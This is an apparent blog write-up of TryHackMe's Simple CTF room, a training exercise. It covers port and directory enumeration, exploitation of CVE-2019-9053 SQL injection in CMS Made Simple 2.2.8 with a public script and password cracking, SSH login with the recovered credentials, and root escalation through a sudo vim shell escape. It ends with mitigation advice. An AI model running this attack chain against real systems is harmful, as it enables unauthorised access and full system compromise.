---
title: "SQL Injection – Authentication Bypass & Privilege Escalation | Simple CTF"
date: 2026-04-07 22:10:00 +0530
categories: [Penetration Testing]
tags: [
  sql-injection,
  authentication-bypass,
  privilege-escalation,
  linux,
  cms-made-simple,
  cve-2019-9053,
  tryhackme
]
platform: TryHackMe
author: Shivansh Sharma
image: { path: /assets/images/posts/simple-ctf.webp, alt: Simple CTF Room }
---

## Overview

This room focuses on web enumeration, exploiting a known CMS vulnerability, and privilege escalation using misconfigured sudo permissions. The attack path demonstrates how outdated software can lead to full system compromise.

---

## Objective

- Enumerate open services
- Identify and exploit web vulnerabilities
- Gain shell access
- Escalate privileges to root

---

## Reconnaissance

### Nmap Scan

```bash
nmap -p- -sV <target_ip>
```

**Results:**

- `21` → FTP (vsftpd 3.0.3)
- `80` → HTTP (Apache 2.4.18)
- `2222` → SSH (OpenSSH 7.2p2)

---

### Web Enumeration

#### Directory Bruteforce

```bash
gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/big.txt
```

**Findings:**

- `/robots.txt`
- `/simple/` → interesting directory
- `.htaccess`, `.htpasswd` (restricted)

#### CMS Identification

Accessing:

```
http://<target_ip>/simple/
```

Reveals:

```
CMS Made Simple version 2.2.8
```

---

## Exploitation

### Vulnerability Identification

The version is vulnerable to:

```
CVE-2019-9053
```

This is an **unauthenticated SQL Injection** vulnerability.

### Exploit Execution

- Found exploit on Exploit-DB
- Modified Python2 script to Python3 for compatibility

Save exploit:

```bash
nano cms-2.2.8.py
```

Run:

```bash
python3 cms-2.2.8.py -u http://<target_ip>/simple --crack -w /usr/share/wordlists/rockyou.txt
```

### Extracted Credentials

```
Username: mitch
Password: secret
```

---

## Initial Access

Login via SSH:

```bash
ssh mitch@<target_ip> -p 2222
```

---

## Privilege Escalation

### Check Sudo Permissions

```bash
sudo -l
```

**Result:**

```
(root) NOPASSWD: /usr/bin/vim
```

### Exploiting Vim (GTFOBins)

```bash
sudo vim -c ':!/bin/sh'
```

### Proof of Exploitation

```bash
whoami
```

```
root
```

---

## Impact

- Unpatched CMS vulnerability allowed SQL injection
- Credentials extracted without authentication
- Misconfigured sudo permissions led to root access

---

## Mitigation

- Keep CMS and plugins updated
- Monitor and patch known CVEs
- Restrict sudo permissions using least privilege
- Avoid allowing powerful binaries like `vim` with root privileges

---

## Real-World Insight

This scenario reflects real-world environments where:

- Outdated CMS platforms are commonly exposed
- Public exploits are readily available
- Simple misconfigurations (like sudo permissions) lead to full compromise

Attackers often chain known vulnerabilities + weak privilege controls rather than using complex exploits.

---

## Conclusion

This room highlights the importance of:

- Proper patch management
- Secure configuration of privileged commands
- Awareness of publicly available exploits

> A single outdated service can compromise the entire system if not properly secured.
